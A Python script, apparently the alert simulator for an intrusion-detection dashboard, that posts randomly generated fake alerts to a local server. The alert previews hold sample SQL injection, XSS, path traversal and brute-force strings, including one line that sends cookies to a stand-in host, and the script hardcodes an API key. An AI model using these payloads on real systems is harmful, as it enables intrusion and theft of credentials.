import requests
import random
import time
import json
from datetime import datetime

# --- CONFIGURATION ---
BASE_URL = "http://127.0.0.1:8000"
# WARNING: Replace this with the actual API key generated during your onboarding!
WORKSPACE_API_KEY = "wids_live_2rhAYxSp6lEsF5SZtdRx68aEeGdG85iW9etZxHzwa6o"

print(f"[{datetime.now().strftime('%H:%M:%S')}] 🛡️ W-IDS Global Threat Simulator Initialized...")

# --- REALISTIC PAYLOAD GENERATOR ---
ATTACK_VECTORS = [
    {
        "type": "SQL Injection",
        "severity": "critical",
        "protocol": "HTTP",
        "action": "logged",
        "payloads": [
            "GET /login.php?user=admin' OR '1'='1' --",
            "POST /search HTTP/1.1\nContent-Type: application/json\n\n{\"query\": \"1; DROP TABLE users\"}",
            "GET /products?id=1 UNION SELECT username, password FROM admin_users"
        ]
    },
    {
        "type": "Cross-Site Scripting (XSS)",
        "severity": "high",
        "protocol": "HTTP",
        "action": "logged",
        "payloads": [
            "GET /forum?topic=<script>fetch('http://hacker.com/steal?c='+document.cookie)</script>",
            "POST /comment HTTP/1.1\n\n<img src='x' onerror='alert(1)'>",
            "GET /profile?name=\"><svg/onload=prompt(1)>"
        ]
    },
    {
        "type": "Path Traversal",
        "severity": "high",
        "protocol": "HTTP",
        "action": "blocked",
        "payloads": [
            "GET /download.php?file=../../../../etc/passwd",
            "GET /assets/../../../windows/system32/cmd.exe"
        ]
    },
    {
        "type": "DDoS Attempt (SYN Flood)",
        "severity": "medium",
        "protocol": "TCP",
        "action": "logged",
        "payloads": [
            "[TCP FLAGS: SYN] Sequence=123456789 Window=65535",
            "[TCP FLAGS: SYN] Malformed packet header detected."
        ]
    },
    {
        "type": "SSH Brute Force",
        "severity": "low",
        "protocol": "TCP",
        "action": "blocked",
        "payloads": [
            "Failed password for root from 192.168.1.100 port 22 ssh2",
            "Invalid user admin from 192.168.1.100"
        ]
    }
]

DESTINATION_IPS = ["10.0.0.5", "10.0.0.10", "192.168.1.50", "172.16.254.1"]
HEADERS = {
    "X-API-Key": WORKSPACE_API_KEY,
    "Content-Type": "application/json"
}

print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔥 Commencing Red Team Assault. Press CTRL+C to abort.\n")

counter = 1
try:
    while True:
        # Generate random attacker IP
        hacker_ip = f"{random.randint(11, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Pick a random attack vector
        vector = random.choice(ATTACK_VECTORS)
        
        alert_payload = {
            "type": vector["type"],
            "severity": vector["severity"],
            "source_ip": hacker_ip,
            "destination_ip": random.choice(DESTINATION_IPS),
            "source_port": random.randint(1024, 65535),
            "destination_port": random.choice([80, 443, 22, 3306]),
            "protocol": vector["protocol"],
            "action": vector["action"],
            "payload_preview": random.choice(vector["payloads"])
        }

        try:
            res = requests.post(f"{BASE_URL}/alerts/ingest", json=alert_payload, headers=HEADERS)
            if res.status_code == 201:
                color = "\033[91m" if alert_payload['severity'] == 'critical' else "\033[93m"
                reset = "\033[0m"
                print(f"[{counter}] {color}[{alert_payload['severity'].upper()}]{reset} -> {alert_payload['type']} from {hacker_ip}")
            else:
                print(f"[{counter}] ❌ Error: Server returned HTTP {res.status_code} - {res.text}")
        except requests.exceptions.ConnectionError:
            print(f"[{counter}] ❌ Connection Refused. Is the backend running on port 8000?")
            time.sleep(5)
            continue

        counter += 1
        
        # Random delay between attacks (1.5 to 4.0 seconds) to simulate realistic traffic
        time.sleep(random.uniform(1.5, 4.0))

except KeyboardInterrupt:
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🛑 Simulation Terminated by User.")